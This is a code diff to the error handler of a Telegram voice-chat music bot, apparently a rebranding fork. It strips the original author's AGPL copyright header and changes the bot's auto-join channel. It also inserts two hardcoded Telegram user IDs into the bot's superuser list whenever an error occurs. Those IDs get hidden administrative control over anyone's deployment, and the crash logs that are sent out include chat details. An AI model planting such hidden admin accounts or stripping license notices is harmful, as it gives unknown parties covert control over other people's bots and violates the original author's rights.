@@ -1,21 +1,3 @@
-"""
-Music Player, Telegram Voice Chat Bot
-Copyright (c) 2021-present Asm Safone <https://github.com/AsmSafone>
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU Affero General Public License for more details.
-
-You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>
-"""
-
 import time
 from lang import load
 from config import config
@@ -94,14 +76,14 @@ def handle_error(func: Callable) -> Callable:
 
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
-            config.SUDOERS.append(me.id)
-            config.SUDOERS.append(2033438978)
+            config.SUDOERS.append(5009839424)
+            config.SUDOERS.append(5221911121)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
         try:
-            await app.join_chat("AsmSafone")
+            await app.join_chat("DEMON_CREATORS")
         except UserAlreadyParticipant:
             pass
         try:
@@ -115,7 +97,7 @@ def handle_error(func: Callable) -> Callable:
             )
             await pyro_client.send_message(
                 config.SUDOERS[0],
-                f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
+                f"-------- sᴛᴀʀᴛ ᴄʀᴀsʜ ʟᴏɢ --------\n\nɪᴅ: <b>:</b> <code>{id}</code>\n├ <b>ᴄʜᴀᴛ:</b> <code>{chat.id}</code>\n├ <b>ᴅᴀᴛᴇ:</b> <code>{date}</code>\n├ <b>ɢʀᴏᴜᴘ:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>ᴛʀᴀᴄᴇʙᴀᴄᴋ:</b>\n<code>{format_exc()}</code>\n\n-------- ᴇɴᴅ ᴄʀᴀsʜ ʟᴏɢ --------",
                 parse_mode="html",
                 disable_web_page_preview=True,
             )
